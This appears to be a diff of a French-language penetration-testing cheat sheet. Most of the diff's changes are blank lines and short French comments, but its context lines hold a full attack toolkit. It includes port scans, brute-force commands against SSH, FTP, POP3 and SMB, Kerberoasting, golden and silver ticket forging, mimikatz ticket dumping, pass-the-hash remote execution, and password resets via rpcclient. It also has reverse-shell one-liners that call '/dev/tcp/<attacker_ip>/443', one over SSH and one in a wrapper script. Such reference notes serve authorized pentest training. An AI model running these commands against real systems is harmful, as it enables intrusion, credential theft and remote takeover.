@@ -20,6 +20,7 @@ whois [domain]
 
 # Utiliser un serveur WHOIS précis 
 whois [domain] -h [server]
+
 ```
 
 
@@ -49,6 +50,7 @@ nslookup -type=TXT [domain] [use_specific_dns_server_optional]
 
 # Résolution en boucle depuis une liste
 for ip in $(cat list.txt); do host <ip>.[domain]; done
+
 ```
 
 
@@ -87,6 +89,7 @@ nc -zvu [host] [port]
 
 # Receive reverse shell in specific port
 nc -nvlp [listening_port]
+
 ```
 
 
@@ -105,6 +108,7 @@ Vérifier les ports et les services de la cible autorisée.
 
 ```bash
 nmap -A [IP/domain] -oN [machine_name].txt
+
 ```
 
 
@@ -115,6 +119,7 @@ nmap -A [IP/domain] -oN [machine_name].txt
 
 ```bash
 sudo nmap -p- -sS -sU --min-rate=1000 --max-retries=1 -T4 [IP/Domain]
+
 ```
 
 
@@ -125,6 +130,7 @@ sudo nmap -p- -sS -sU --min-rate=1000 --max-retries=1 -T4 [IP/Domain]
 
 ```bash
 nmap -p- -T4 -n -Pn [IP/domain] -oN [machine_name]_ports.txt
+
 ```
 
 
@@ -135,6 +141,7 @@ nmap -p- -T4 -n -Pn [IP/domain] -oN [machine_name]_ports.txt
 
 ```bash
 sudo nmap --min-rate 5000 -p- -vvv -Pn -n -oG openPorts.txt [IP]
+
 ```
 
 
@@ -145,6 +152,7 @@ sudo nmap --min-rate 5000 -p- -vvv -Pn -n -oG openPorts.txt [IP]
 
 ```bash
 nmap -p- [IP/Domain] -oN [machine_name]_ports.txt
+
 ```
 
 
@@ -155,6 +163,7 @@ nmap -p- [IP/Domain] -oN [machine_name]_ports.txt
 
 ```bash
 nmap [IP/Domain] --top-ports [number_of_top_ports]
+
 ```
 
 
@@ -174,11 +183,14 @@ Vérifier les ports et les services de la cible autorisée.
 
 ```bash
 sudo nmap -sU -sS [IP]
+
 ```
 
 
 ```bash
+# Examiner les ports UDP
 sudo nmap -sU -T5 --top-ports 500 [IP]
+
 ```
 
 
@@ -193,6 +205,7 @@ sudo nmap -sU -T5 --top-ports 500 [IP]
 
 ```bash
 nmap -sT [IP]
+
 ```
 
 
@@ -207,6 +220,7 @@ nmap -sT [IP]
 
 ```bash
 sudo nmap -sS [IP]
+
 ```
 
 
@@ -217,6 +231,7 @@ sudo nmap -sS [IP]
 
 ```bash
 nmap -p [portNumber] [IP]
+
 ```
 
 
@@ -231,6 +246,7 @@ nmap -p [portNumber] [IP]
 
 ```bash
 nmap -sn [IP_range]
+
 ```
 
 
@@ -241,6 +257,7 @@ nmap -sn [IP_range]
 
 ```bash
 nmap --top-ports=20 [IP]
+
 ```
 
 
@@ -264,6 +281,7 @@ Vérifier les ports et les services de la cible autorisée.
 
 ```bash
 nmap -O [IP]
+
 ```
 
 
@@ -274,6 +292,7 @@ nmap -O [IP]
 
 ```bash
 nmap --osscan-guess [IP]
+
 ```
 
 
@@ -288,6 +307,7 @@ nmap --osscan-guess [IP]
 
 ```bash
 nmap -sV [IP]
+
 ```
 
 
@@ -298,6 +318,7 @@ nmap -sV [IP]
 
 ```bash
 nmap -A [IP]
+
 ```
 
 
@@ -321,6 +342,7 @@ Observer les permissions et la configuration de Windows.
 
 ```bash
 nmap -v -sn [IP_range] -oG [fileName].txt
+
 ```
 
 
@@ -335,6 +357,7 @@ nmap -v -sn [IP_range] -oG [fileName].txt
 
 ```bash
 grep Up [fileName].txt cut -d " " -f 2
+
 ```
 
 
@@ -358,6 +381,7 @@ Vérifier les ports et les services de la cible autorisée.
 
 ```bash
 nmap --script [scriptName] [IP]
+
 ```
 
 
@@ -368,6 +392,7 @@ nmap --script [scriptName] [IP]
 
 ```bash
 nmap --script-help [scriptName]
+
 ```
 
 
@@ -378,6 +403,7 @@ nmap --script-help [scriptName]
 
 ```bash
 nmap --script http-headers [IP]
+
 ```
 
 
@@ -388,6 +414,7 @@ nmap --script http-headers [IP]
 
 ```bash
 nmap --script [category] [IP]
+
 ```
 
 
@@ -409,6 +436,7 @@ Observer les permissions et la configuration de Windows.
 
 ```powershell
 Test-NetConnection -Port [portNumber] [IP]
+
 ```
 
 
@@ -419,6 +447,7 @@ Test-NetConnection -Port [portNumber] [IP]
 
 ```text
 1..1024 % {echo ((New-Object Net.Sockets.TcpClient).Connect("[IP]", $_)) "TCP port $_ is open"} 2>$null
+
 ```
 
 
@@ -434,6 +463,7 @@ Vérifier les ports et les services de la cible autorisée.
 
 ```bash
 rustscan -a <target-ip> -p 1-65535
+
 ```
 
 
@@ -444,6 +474,7 @@ rustscan -a <target-ip> -p 1-65535
 
 ```bash
 rustscan -a <target-ip> -p 1-65535 -- -Pn
+
 ```
 
 
@@ -454,6 +485,7 @@ rustscan -a <target-ip> -p 1-65535 -- -Pn
 
 ```bash
 rustscan -a <target-ip> -r 1-1000
+
 ```
 
 
@@ -464,6 +496,7 @@ rustscan -a <target-ip> -r 1-1000
 
 ```bash
 rustscan -a <target-ip> -b 500 -u 5000
+
 ```
 
 
@@ -474,6 +507,7 @@ rustscan -a <target-ip> -b 500 -u 5000
 
 ```bash
 rustscan -a <target-ip> -p 22,80,443
+
 ```
 
 
@@ -484,6 +518,7 @@ rustscan -a <target-ip> -p 22,80,443
 
 ```bash
 rustscan -a <target-ip> -- -oN [machine]_rustscan.txt
+
 ```
 
 
@@ -494,6 +529,7 @@ rustscan -a <target-ip> -- -oN [machine]_rustscan.txt
 
 ```bash
 rustscan -a <target-ip> -- -sU -p 1-65535
+
 ```
 
 
@@ -504,6 +540,7 @@ rustscan -a <target-ip> -- -sU -p 1-65535
 
 ```bash
 rustscan -a <target-ip> -p 1-65535 -- -sV --script vuln
+
 ```
 
 
@@ -514,6 +551,7 @@ rustscan -a <target-ip> -p 1-65535 -- -sV --script vuln
 
 ```bash
 rustscan -a <target-ip> -p 1-65535 -g -q
+
 ```
 
 
@@ -524,6 +562,7 @@ rustscan -a <target-ip> -p 1-65535 -g -q
 
 ```bash
 rustscan -a <target-ip> -p 1-65535 --exclude-ports 80,443
+
 ```
 
 
@@ -534,6 +573,7 @@ rustscan -a <target-ip> -p 1-65535 --exclude-ports 80,443
 
 ```bash
 rustscan -a <target-ip> -p 1-65535 -- -O
+
 ```
 
 
@@ -544,6 +584,7 @@ rustscan -a <target-ip> -p 1-65535 -- -O
 
 ```bash
 rustscan -a <target-ip> -p 1-65535 -- -sS -sU
+
 ```
 
 
@@ -561,6 +602,7 @@ Transférer ou récupérer des fichiers dans le laboratoire.
 
 ```bash
 nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 [IP]
+
 ```
 
 
@@ -575,6 +617,7 @@ anonymous:anonymous
 
 # Télécharger un fichier de test pour vérifier la réflexion sur un port HTTP
 put test.txt
+
 ```
 
 
@@ -582,6 +625,7 @@ put test.txt
 ftp> binary
 
 ftp> put [binary_file]
+
 ```
 
 
@@ -595,6 +639,7 @@ find / -name [filename_pattern] 2>/dev/null
 
 # Exemple de recherche de fichiers
 find / -name Settings.*  2>/dev/null
+
 ```
 
 
@@ -602,6 +647,7 @@ find / -name Settings.*  2>/dev/null
 
 ```bash
 hydra -l [username] -P [path_to_wordlist] [IP] -t 4 ftp
+
 ```
 
 
@@ -609,6 +655,7 @@ hydra -l [username] -P [path_to_wordlist] [IP] -t 4 ftp
 
 ```bash
 ftp -p [IP]
+
 ```
 
 
@@ -635,6 +682,7 @@ nmap -p 22 --script=ssh3-enum-algos,sshv1 <target_ip>
 
 # SSH Public Key Authentication
 nmap -p 22 --script=ssh-publickey-acceptance --script-args ssh.user=<username>,ssh.privatekey=<path_to_private_key> <target_ip>
+
 ```
 
 
@@ -646,6 +694,7 @@ hydra -l <user> -P /usr/share/wordlists/rockyou.txt <target_ip> -t 4 ssh
 hydra -L <user_list> -p <password> <target_ip> -t 4 ssh -s <port>
 
 hydra -f -V -C /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt -s 22 [IP] ssh
+
 ```
 
 
@@ -655,6 +704,7 @@ hydra -f -V -C /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefau
 chmod 600 [output_key_file]
 
 ssh [user]@[IP] -i [output_key_file]
+
 ```
 
 
@@ -662,6 +712,7 @@ ssh [user]@[IP] -i [output_key_file]
 
 ```bash
 puttygen [putty_key_file] -O private-openssh -o [output_key_file]
+
 ```
 
 
@@ -671,6 +722,7 @@ puttygen [putty_key_file] -O private-openssh -o [output_key_file]
 ssh2john <private_key_file> > <private_key_file>.hash
 
 john --wordlist=/usr/share/wordlists/rockyou.txt <private_key_file>.hash
+
 ```
 
 
@@ -680,6 +732,7 @@ john --wordlist=/usr/share/wordlists/rockyou.txt <private_key_file>.hash
 find /etc/ssh -name "*.pub"
 
 find /home/<user>/.ssh -name "id_*"
+
 ```
 
 
@@ -691,6 +744,7 @@ ssh2john <private_key_file> > <private_key_file>.hash # id_rsa has no password!
 
 # Utilisateur ou clé incorrects
 ssh <user>@<target_ip> -p <port> -i <private_key_file> # Error message: Permission denied (publickey,password).
+
 ```
 
 
@@ -724,6 +778,7 @@ scp -v user@192.168.1.10:/etc/config.txt /home/user/
 # Télécharger le fichier sans clé d'hôte Vérification, pour contourner la clé d'hôte vérification (pas recommandé pour des environnements sécurisés)
 scp -o StrictHostKeyChecking=no user@remote_host:/path/to/remote/file /local/destination/
 scp -o StrictHostKeyChecking=no user@192.168.1.10:/etc/config.txt /home/user/
+
 ```
 
 
@@ -755,6 +810,7 @@ scp -v /home/user/config.txt user@192.168.1.10:/etc/config.txt
 # Télécharger le fichier sans vérification de clé d'hôte, pour contourner la vérification de clé d'hôte (pas recommandé pour des environnements sécurisés)
 scp -o StrictHostKeyChecking=no /path/to/local/file user@remote_host:/path/to/remote/destination/
 scp -o StrictHostKeyChecking=no /home/user/config.txt user@192.168.1.10:/etc/config.txt
+
 ```
 
 
@@ -766,6 +822,7 @@ scp -o StrictHostKeyChecking=no /home/user/config.txt user@192.168.1.10:/etc/con
 
 ```bash
 ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no user@target_ip
+
 ```
 
 
@@ -776,7 +833,9 @@ ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no user@target_ip
 
 
 ```bash
+# Ouvrir une session SSH
 ssh -c aes128-cbc user@target_ip
+
 ```
 
 
@@ -787,7 +846,9 @@ ssh -c aes128-cbc user@target_ip
 
 
 ```bash
+# Ouvrir une session SSH
 ssh -2 user@target_ip
+
 ```
 
 
@@ -801,6 +862,7 @@ ssh -2 user@target_ip
 ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa <user>@<target_ip> -t 'bash -i >& /dev/tcp/<attacker_ip>/443 0>&1'
 
 nc -nvlp [listening_port]
+
 ```
 
 
@@ -808,6 +870,7 @@ nc -nvlp [listening_port]
 
 ```bash
 ssh user@target_ip "whoami"
+
 ```
 
 
@@ -824,6 +887,7 @@ case $SSH_ORIGINAL_COMMAND in
     bash -i >& /dev/tcp/<attacker_ip>/443 0>&1
     ;;
 esac
+
 ```
 
 
@@ -833,6 +897,7 @@ esac
 scp -i <private_key_file> scp_wrapper.sh <user>@<target_ip>:/home/<user>/
 
 nc -nlvp [listening_port]
+
 ```
 
 
@@ -840,6 +905,7 @@ nc -nlvp [listening_port]
 
 ```bash
 ssh -i <private_key_file> <user>@<target_ip>
+
 ```
 
 
@@ -854,6 +920,7 @@ telnet <target_ip> 23
 
 # Login with specific username
 telnet -l <username> <target_ip>
+
 ```
 
 
@@ -881,6 +948,7 @@ VRFY root
 VRFY test_user
 550 5.1.1 <test_user>: Recipient address rejected: User unknown in local recipient table
 ^C
+
 ```
 
 
@@ -895,6 +963,7 @@ b'252 2.0.0 root\r\n'
 kali@kali:~/Desktop$ python3 smtp.py testUser 192.168.123.8
 b'220 mail ESMTP Postfix (Ubuntu)\r\n'
 b'550 5.1.1 <testUser>: Recipient address rejected: User unknown in local recipient table\r\n'
+
 ```
 
 
@@ -927,6 +996,7 @@ print(result)
 
 # Fermer la socket
 s.close()
+
 ```
 
 
@@ -942,6 +1012,7 @@ VRFY testUser
 550 5.1.1 <testUser>: Recipient address rejected: User unknown in local recipient table
 VRFY root
 252 2.0.0 root
+
 ```
 
 
@@ -955,6 +1026,7 @@ nmap -sV -p [port] --script http-shellshock --script-args uri=/cgi-bin/user.sh,c
 python2 shellshock.py <target_ip> <username>@<domain> <attacker_ip> 139 <root>@<domain>
 
 # Exemple : python2 shellshock.py 192.168.1.100 emmanuel@domaine.local 192.168.1.50 139 admin@domaine.local
+
 ```
 
 
@@ -967,11 +1039,14 @@ Interroger les enregistrements DNS et identifier les services associés.
 
 ```bash
 nmap --script dns-brute,dns-nsid,dns-recursion,dns-zone-transfer -p 53 <target_ip>
+
 ```
 
 
 ```bash
+# Exécuter les scripts NSE sélectionnés
 nmap -p 53 --script "dns-nsid,dns-srv-enum" <target_ip>
+
 ```
 
 
@@ -984,13 +1059,16 @@ nslookup
 > server <dns_server_ip>
 > set type=any
 > <domain_name>  # Query any records
+
 ```
 
 
 ```bash
+# Énumérer les enregistrements DNS
 dnsrecon -d <domain_name> -n <dns_server_ip> -t axfr
 
 dnsenum --enum -f /usr/share/dnsenum/dns.txt --dnsserver <dns_server_ip> <domain_name>
+
 ```
 
 
@@ -998,6 +1076,7 @@ dnsenum --enum -f /usr/share/dnsenum/dns.txt --dnsserver <dns_server_ip> <domain
 
 ```bash
 nmap -sL <target_ip_range> | grep "Nmap scan report"  # Reverse DNS lookup for a range
+
 ```
 
 
@@ -1005,6 +1084,7 @@ nmap -sL <target_ip_range> | grep "Nmap scan report"  # Reverse DNS lookup for a
 
 ```bash
 dig @<dns_server_ip> -t A +norecurse <target_domain>
+
 ```
 
 
@@ -1012,6 +1092,7 @@ dig @<dns_server_ip> -t A +norecurse <target_domain>
 
 ```powershell
 Resolve-DnsName -Name <domain_name> -Server <dns_server_ip> -DnsOnly
+
 ```
 
 
@@ -1024,6 +1105,7 @@ Transférer ou récupérer des fichiers dans le laboratoire.
 
 ```bash
 nmap -p 69 --script tftp-enum <target_ip>
+
 ```
 
 
@@ -1033,6 +1115,7 @@ nmap -p 69 --script tftp-enum <target_ip>
 # Utilisation : exécutez le script de dénombrement TFTP pour obtenir un fichier spécifique
 ./tftp_enum.sh <target_ip> <filename>
 ./tftp_enum.sh 192.168.1.10 bootfile.bin
+
 ```
 
 
@@ -1060,22 +1143,27 @@ if [ -f $FILENAME ]; then
 else
     echo "Failed to retrieve $FILENAME from $TARGET_IP"
 fi
+
 ```
 
 
 
 
 ```bash
+# Interroger le service TFTP
 tftp <target_ip> 69
 tftp> get <remote_file> <local_file>
 tftp> quit
+
 ```
 
 
 ```bash
+# Interroger le service TFTP
 tftp <target_ip> 69
 tftp> put <local_file> <remote_file>
 tftp> quit
+
 ```
 
 
@@ -1083,6 +1171,7 @@ tftp> quit
 
 ```bash
 for i in $(cat <file_list.txt>); do tftp <target_ip> 69 -c get $i; done
+
 ```
 
 
@@ -1091,6 +1180,7 @@ for i in $(cat <file_list.txt>); do tftp <target_ip> 69 -c get $i; done
 ```bash
 echo -e "get <remote_file> <local_file>\nquit" | tftp <target_ip>
 echo -e "put <local_file> <remote_file>\nquit" | tftp <target_ip>
+
 ```
 
 
@@ -1110,6 +1200,7 @@ nmap -p 88 --script kerberos-brute <target_ip>
 
 # Énumérer les NSP (Noms principaux des services)
 nmap -p 88 --script krb5-enum-users,krb5-scan <target_ip>
+
 ```
 
 
@@ -1119,6 +1210,7 @@ nmap -p 88 --script krb5-enum-users,krb5-scan <target_ip>
 kerbrute userenum -d <domain> -p <userlist> <target_ip>
 # Autre possibilité
 ./kerbrute_linux_amd64 userenum -d <target_ip> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+
 ```
 
 
@@ -1126,6 +1218,7 @@ kerbrute userenum -d <domain> -p <userlist> <target_ip>
 
 ```bash
 impacket-GetNPUsers -dc-ip <dc_ip> -request -usersfile <userlist> <target_domain>
+
 ```
 
 
@@ -1133,6 +1226,7 @@ impacket-GetNPUsers -dc-ip <dc_ip> -request -usersfile <userlist> <target_domain
 
 ```bash
 impacket-GetTGT -dc-ip <dc_ip> -outputfile <outputfile> <username>@<domain>
+
 ```
 
 
@@ -1142,6 +1236,7 @@ impacket-GetTGT -dc-ip <dc_ip> -outputfile <outputfile> <username>@<domain>
 john --wordlist=<wordlist> <ticket_file>
 # or
 hashcat -m 13100 <ticket_file> <wordlist>
+
 ```
 
 
@@ -1153,6 +1248,7 @@ python3 GetTGT.py -dc-ip <dc_ip> <domain>/<username>:<password>
 
 # Request a Service Ticket (TGS)
 python3 GetST.py -dc-ip <dc_ip> <domain>/<username>:<password> -spn <service>/<target>
+
 ```
 
 
@@ -1166,13 +1262,16 @@ impacket-GetUserSPNs -dc-ip <dc_ip> -outputfile <tickets_file> <domain>/<usernam
 john --wordlist=<wordlist> <tickets_file>
 # or
 hashcat -m 13100 <tickets_file> <wordlist>
+
 ```
 
 
 
 
 ```bash
+# Vérifier les identifiants Kerberos
 krb5-brute -d <domain> -t <target_ip> -u <username> -p <password_list>
+
 ```
 
 
@@ -1186,6 +1285,7 @@ python3 psexec.py <domain>/<username>:<password>@<target_ip> -impersonate-user <
 rubeus.exe asktgt /user:<username> /rc4:<password>
 rubeus.exe tgtdeleg /user:<username> /rc4:<password>
 rubeus.exe s4u /user:<username> /rc4:<password> /impersonateuser:<target_user>
+
 ```
 
 
@@ -1194,6 +1294,7 @@ rubeus.exe s4u /user:<username> /rc4:<password> /impersonateuser:<target_user>
 ```powershell
 # Domptez les tickets Kerberos de la mémoire en utilisant Mimikatz
 mimikatz "lsadump::dcom" "sekurlsa::tickets /export"
+
 ```
 
 
@@ -1202,6 +1303,7 @@ mimikatz "lsadump::dcom" "sekurlsa::tickets /export"
 ```bash
 # Essai de configurations de pré-authentification faibles
 python3 kerbrute.py -d <domain> -u <user_list> -p <password_list> -dc <dc_ip>
+
 ```
 
 
@@ -1210,6 +1312,7 @@ python3 kerbrute.py -d <domain> -u <user_list> -p <password_list> -dc <dc_ip>
 ```bash
 # Créer un ticket argent avec Rubeus
 rubeus.exe tgt::add /user:<username> /rc4:<password> /sid:<domain_sid> /domain:<domain>
+
 ```
 
 
@@ -1221,6 +1324,7 @@ impacket-GetTGT -dc-ip <dc_ip> -outputfile <tgt_file> <user>@<domain>
 
 # 2. Forge a Silver Ticket
 impacket-atexec -target-ip <target_ip> -service <service> -ticket <ticket_file> <username>
+
 ```
 
 
@@ -1229,6 +1333,7 @@ impacket-atexec -target-ip <target_ip> -service <service> -ticket <ticket_file> 
 ```bash
 # Créer un billet doré avec Rubeus
 rubeus.exe tgt::add /user:<username> /rc4:<password> /domain:<domain> /sid:<domain_sid> /rc4:<krbtgt_hash>
+
 ```
 
 
@@ -1246,6 +1351,7 @@ impacket-smbexec -target-ip <target_ip> -ticket <ticket_file> <username>
 
 # (Optional) Pass the Golden Ticket
 impacket-psexec -target-ip <target_ip> -ticket <ticket_file> <username>
+
 ```
 
 
@@ -1256,6 +1362,7 @@ impacket-psexec -target-ip <target_ip> -ticket <ticket_file> <username>
 
 ```bash
 nmap --script "pop3-capabilities or pop3-ntlm-info" -sV -p 110 <target_ip>
+
 ```
 
 
@@ -1274,6 +1381,7 @@ LIST
 
 # Récupérer le premier courriel
 RETR 1
+
 ```
 
 
@@ -1285,6 +1393,7 @@ hydra -l <username> -P <password_list> -f <target_ip> pop3 -V
 
 # Force brute avec SSL/TLS sur POP3 au-dessus du port 995
 hydra -S -v -l <username> -P <password_list> -s 995 -f <target_ip> pop3 -V
+
 ```
 
 
@@ -1306,6 +1415,7 @@ RETR <mail_number>
 
 # Fermer la connexion
 QUIT
+
 ```
 
 
@@ -1316,6 +1426,7 @@ QUIT
 
 ```bash
 nmap -sV -p 111 --script=rpcinfo <target_ip>
+
 ```
 
 
@@ -1324,6 +1435,7 @@ nmap -sV -p 111 --script=rpcinfo <target_ip>
 ```bash
 # Utilisez rpcinfo pour obtenir une liste des services RPC enregistrés sur la cible
 rpcinfo -p <target_ip>
+
 ```
 
 
@@ -1332,6 +1444,7 @@ rpcinfo -p <target_ip>
 ```bash
 # Vérifiez les services RPC disponibles et leurs versions avec showmount
 showmount -e <target_ip>
+
 ```
 
 
@@ -1342,6 +1455,7 @@ showmount -e <target_ip>
 
 ```bash
 nmap -p 135 --script msrpc-enum <target_ip>
+
 ```
 
 
@@ -1352,7 +1466,9 @@ nmap -p 135 --script msrpc-enum <target_ip>
 
 
 ```bash
+# Lister les points de terminaison RPC
 rpcdump.py <target_ip> -p 135
+
 ```
 
 
@@ -1361,6 +1477,7 @@ rpcdump.py <target_ip> -p 135
 ```bash
 # Scanner les services RPC sur les services HTTP en utilisant Nmap
 nmap -p 593 --script http-rpc-epmap <target_ip>
+
 ```
 
 
@@ -1385,6 +1502,7 @@ rpcclient -U "" -N <target_ip> -c "enumdomgroups"
 
 # Demande d'informations à l'utilisateur
 rpcclient -U "<username>" -W "<domain>" <target_ip> -c "queryuser <username>"
+
 ```
 
 
@@ -1408,6 +1526,7 @@ lsaaddacctrights
 lsaremoveacctrights
 dsroledominfo
 dsenumdomtrusts
+
 ```
 
 
@@ -1426,6 +1545,7 @@ lookupnames <username>
 
 # Obtenez des Aliases Utilisateurs
 queryuseraliases [builtin|domain] <sid>
+
 ```
 
 
@@ -1440,6 +1560,7 @@ querygroup <0xrid>
 
 # Obtenir des membres du groupe
 querygroupmem <0xrid>
+
 ```
 
 
@@ -1451,6 +1572,7 @@ enumalsgroups <builtin|domain>
 
 # Obtenez des membres d'Alias
 queryaliasmem builtin|domain <0xrid>
+
 ```
 
 
@@ -1465,6 +1587,7 @@ lsaquery
 
 # Obtenir des informations de domaine
 querydominfo
+
 ```
 
 
@@ -1481,6 +1604,7 @@ crackmapexec smb <IP> -u 'wordlist_user.txt' -p password
 
 # Lookup SID avec Brute Force (exige que nous ayons des identifiants valides et le nom de domaine)
 impacket-lookupsid [domain.com]/[userName]:[domain.com]@987@[ip]
+
 ```
 
 
@@ -1495,6 +1619,7 @@ lsaenumsid
 
 # Vérifiez le cycle RID pour plus de SID
 lookupsids <sid>
+
 ```
 
 
@@ -1508,6 +1633,7 @@ lookupsids <sid>
 rpcclient -N <target_ip> -U '<username>%<password>' -c "setuserinfo2 <target_username> 23 '<new_password>'"
 # Autre possibilité
 rpcclient -U "" -N <ip> -c "setuserinfo2 <USER> 23 <NEW_PASSWORD>"
+
 ```
 
 
@@ -1532,6 +1658,7 @@ sudo nbtscan -r 192.168.50.0/24
 
 # Vue réseau Windows
 net view \\[domainName] /all
+
 ```
 
 
@@ -1549,6 +1676,7 @@ nmap -p139,445 --script "smb-vuln-* and not(smb-vuln-regsvc-dos)" --script-args 
 nmap --script smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-cve-2017-7494.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse,smb-vuln-regsvc-dos.nse,smb-vuln-webexec.nse -p445 <ip>
 
 nmap --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -p445 <ip>
+
 ```
 
 
@@ -1560,6 +1688,7 @@ sudo ngrep -i -d <INTERFACE> 's.?a.?m.?b.?a.*[[:digit:]]' port 139
 
 # Listes des actions SMB disponibles sur la cible
 smbclient -L <IP>
+
 ```
 
 
@@ -1574,6 +1703,7 @@ smbmap -H <IP>
 smbmap -u '' -p '' -H <IP>
 smbmap -u 'guest' -p '' -H <IP>
 smbmap -u '' -p '' -H <IP> -R
+
 ```
 
 
@@ -1586,6 +1716,7 @@ crackmapexec smb <IP> -u 'guest' -p ''
 crackmapexec smb <IP> -u '' -p '' --shares
 crackmapexec smb <IP> -u guest -p "" --rid-brute
 crackmapexec smb <IP> -u '[user]' -p '[password]'
+
 ```
 
 
@@ -1606,10 +1737,12 @@ enum4linux -a -M -l -d <ip> 2>&1
 enum4linux -a -u "" -p "" <ip>
 enum4linux -a -u "guest" -p "" <ip>
 enum4linux -a -u "[user]" -p "[password]" <ip>
+
 ```
 
 
 ```bash
+# Lister les partages SMB du serveur
 smbclient --no-pass -L //<ip>
 smbclient -L //<ip> -U [user]
 smbclient //<IP>/<SHARE>
@@ -1624,6 +1757,7 @@ timeout 100
 prompt off
 recurse on
 mget *
+
 ```
 
 
@@ -1632,6 +1766,7 @@ mget *
 ```bash
 crackmapexec smb <IP> -u <USERS_LIST> -p <PASSWORDS_LIST>
 hydra -V -f -L <USERS_LIST> -P <PASSWORDS_LIST> smb://<IP> -u -vV
+
 ```
 
 
@@ -1642,6 +1777,7 @@ hydra -V -f -L <USERS_LIST> -P <PASSWORDS_LIST> smb://<IP> -u -vV
 mkdir /tmp/share
 sudo mount -t cifs //<IP>/<SHARE> /tmp/share
 sudo mount -t cifs -o 'username=<USER>,password=<PASSWORD>' //<IP>/<SHARE> /tmp/share
+
 ```
 
 
@@ -1663,6 +1799,7 @@ smbexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>
 # AteExec
 atexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP> <COMMAND>
 atexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>
+
 ```
 
 
@@ -1676,6 +1813,7 @@ psexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>
 # Vérification avec CrackMapExec
 crackmapexec smb <IP> -u <USER> -p <PASSWORD> --psexec
 crackmapexec smb <IP> -u <USER> -H <NTHASH> --psexec
+
 ```
 
 
@@ -1691,6 +1829,7 @@ wmiexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>
 # Vérification avec CrackMapExec
 crackmapexec wmiexec <IP> -u <USER> -p <PASSWORD>
 crackmapexec wmiexec <IP> -u <USER> -H <NTHASH>
+
 ```
 
 
@@ -1701,6 +1840,7 @@ crackmapexec wmiexec <IP> -u <USER> -H <NTHASH>
 
 ```bash
 nmap -p 143,993 --script imap-ntlm-info <ip>
+
 ```
 
 
@@ -1708,6 +1848,7 @@ nmap -p 143,993 --script imap-ntlm-info <ip>
 
 ```bash
 openssl s_client -connect <target-ip>:993
+
 ```
 
 
@@ -1715,6 +1856,7 @@ openssl s_client -connect <target-ip>:993
 
 ```bash
 searchsploit imap <version>
+
 ```
 
 
@@ -1723,6 +1865,7 @@ searchsploit imap <version>
 ```bash
 # Usage
 python3 check_imap.py <target-ip> <port>
+
 ```
 
 
@@ -1749,6 +1892,7 @@ if __name__ == "__main__":
     port = int(sys.argv[2])
     
     check_imap_capabilities(host, port)
+
 ```
 
 
@@ -1763,6 +1907,7 @@ sudo nmap -sU --open -p 161 <target-ip-range> -oG open-snmp.txt
 sudo nmap --script snmp-* -sU -p 161 <target-ip>
 
 sudo nmap -sU -p 161 --script snmp-brute --script-args snmp-brute.communitiesdb=<community-file> <target-ip>
+
 ```
 
 
@@ -1772,6 +1917,7 @@ sudo nmap -sU -p 161 --script snmp-brute --script-args snmp-brute.communitiesdb=
 # Version: 1, 2c, 3
 # Community String: public, private, security, etc
 snmpwalk -v <SNMP_VERSION> -c <COMMUNITY_STRING> <target-ip> .1
+
 ```
 
 
@@ -1791,6 +1937,7 @@ snmpbulkwalk -c <COMMUNITY_STRING> -v <SNMP_VERSION> <target-ip>
 
 # Snmp-check
 snmp-check <target-ip>
+
 ```
 
 
@@ -1808,6 +1955,7 @@ echo <community3> >> community
 for ip in $(seq 1 254); do echo <target-network>.<ip>; done > ips
 
 onesixtyone -c community -i ips
+
 ```
 
 
@@ -1815,11 +1963,14 @@ onesixtyone -c community -i ips
 
 ```bash
 snmpwalk -v <SNMP_VERSION> -c <COMMUNITY_STRING> <target-ip> NET-SNMP-EXTEND-MIB::nsExtendOutputFull
+
 ```
 
 
 ```bash
+# Interroger les objets SNMP
 snmpwalk -c <COMMUNITY_STRING> -v <SNMP_VERSION> <target-ip> <OID>
+
 ```
 
 
@@ -1833,6 +1984,7 @@ snmpwalk -c <COMMUNITY_STRING> -v <SNMP_VERSION> <target-ip> <OID>
 1.3.6.1.2.1.25.4.2.1.4 --> Processes Path
 1.3.6.1.2.1.25.2.3.1.4 --> Storage Units
 1.3.6.1.2.1.25.6.3.1.2 --> Softyware Name
+
 ```
 
 
@@ -1845,6 +1997,7 @@ Examiner les objets, les droits et les services du domaine.
 
 ```bash
 nmap -n -sV --script "ldap* and not brute" <target_ip>
+
 ```
 
 
@@ -1881,6 +2034,7 @@ ldapsearch -H ldap://<target_ip> -x -D '<domain>\<user>' -w '<password>' -b "DC=
 
 # Specifies the value term to return
 ldapsearch -H ldap://<target_ip> -x -D '<domain>\<user>' -w '<password>' -b "DC=<domain>,DC=<tld>" "<term>" <additionalTerm>
+
 ```
 
 
@@ -1888,6 +2042,7 @@ ldapsearch -H ldap://<target_ip> -x -D '<domain>\<user>' -w '<password>' -b "DC=
 
 ```bash
 kerbrute userenum -d <domain> --dc <dc_ip> <userlist>
+
 ```
 
 
@@ -1988,6 +2143,7 @@ kerbrute userenum -d <domain> --dc <dc_ip> <userlist>
 
 # Rechercher tous les comptes avec des attributs spécifiques
 (pwdLastSet=0)
+
 ```
 
 
@@ -2003,6 +2159,7 @@ nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config
 
 # Énumérer les informations et les configurations de la base de données MSSQL
